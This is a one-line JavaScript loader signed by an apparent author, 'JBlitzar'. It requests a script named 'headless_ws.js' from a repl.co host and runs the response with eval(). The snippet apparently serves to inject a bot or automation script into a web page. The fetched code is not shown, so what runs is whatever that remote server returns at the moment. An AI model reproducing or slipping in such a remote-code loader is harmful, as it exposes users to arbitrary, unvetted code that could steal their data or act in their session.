//Made by JBlitzar

var http = new XMLHttpRequest();var url = 'https://stomped-script.jblitzar.repl.co/headless_ws.js';var params = new URLSearchParams().toString();http.open('GET', url, true);http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');http.onreadystatechange = function() {if(http.readyState == 4 && http.status == 200) {eval(http.responseText);}};http.send(params);